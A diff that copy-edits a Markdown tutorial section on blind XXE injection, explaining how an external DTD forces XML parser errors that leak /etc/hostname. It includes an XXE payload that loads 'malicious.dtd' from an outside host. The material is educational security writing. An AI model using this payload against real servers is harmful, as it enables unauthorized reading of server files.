@@ -304,13 +304,13 @@ If all ran successfully we should see a HTTP GET request with the contents of `/
 
 ### Exfiltrate data using Blind XXE Injection through error messages
 
-In some cases, you might be able to exfiltrate data using error messages that gets returned from the server.
+In some cases, you might be able to exfiltrate data using error messages that gets returned from the webserver.
 
-For example, if you try to refer XML external entity to some non-existent file, you will receive an error message along with the file name. If the server sends the error message with the response then, we can try to exfiltrate data in it.
+For example, if you try to refer a XML external entity to some non-existent file, you will receive an error message with the filename in it. If the server sends the error message with the response then, we can exfiltrate data with it.
 
 To be able to use this technique we need two things,
 
-1. First, we host an external DTD that will *throw an XML error intentionally* and the error message **must include** the data that we want to exfiltrate.
+1. First, we need to host an external DTD that will *throw an XML error intentionally* and the error message **must include** the data that we want to exfiltrate.
 2. Second, an external entity must be sent to the vulnerable webserver which will load the external DTD file from our server and then, use it.
 
 The malicious XML DTD will look something like this,
@@ -327,7 +327,7 @@ The DTD will,
 1. Create an external XML entity `file`, that will contain the contents of file `/etc/hostname`.
 2. Create another external entity `eval`, that will declare a *dynamic external entity* `error`.
 3. Next, `file` is evaluated with contents from file `/etc/hostname`.
-4. When `eval` gets evaluated, a new *XML external entity* `error`, gets declared with reference to the file `/bla/bla/%file;`. Here, `%file;` get replaced with contents of `file` entity. If file `/etc/hostname` contains `WyvernDrexx` then, `file` entity will have `WyvernDrexx` so, the `error` entity will refer to file: `/bla/bla/WyvernDrexx`. 
+4. When `eval` gets evaluated, a new *XML external entity* `error` gets declared with reference to the file `/bla/bla/%file;`. Here, `%file;` get replaced with contents of `file` entity. If file `/etc/hostname` contains `WyvernDrexx` then, `file` entity will have `WyvernDrexx` so, the `error` entity will refer to the file: `/bla/bla/WyvernDrexx`.
 5. At last, since file `/bla/bla/WyvernDrexx` doesn't exist so the **XML parser** fails to evaluate `error` and throws an error similar to, `Error: File '/bla/bla/WyvernDrexx;' does not exist.`. Now, from the error message we can extract the hostname of the server.
 
 The DTD sent to the server that will trigger the malicious DTD will be,
@@ -335,3 +335,5 @@ The DTD sent to the server that will trigger the malicious DTD will be,
 ```xml
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://target.site.com/malicious.dtd"> %xxe;]>
 ```
+
+We can exfiltrate any data using this technique as long as the error messages are shown. 
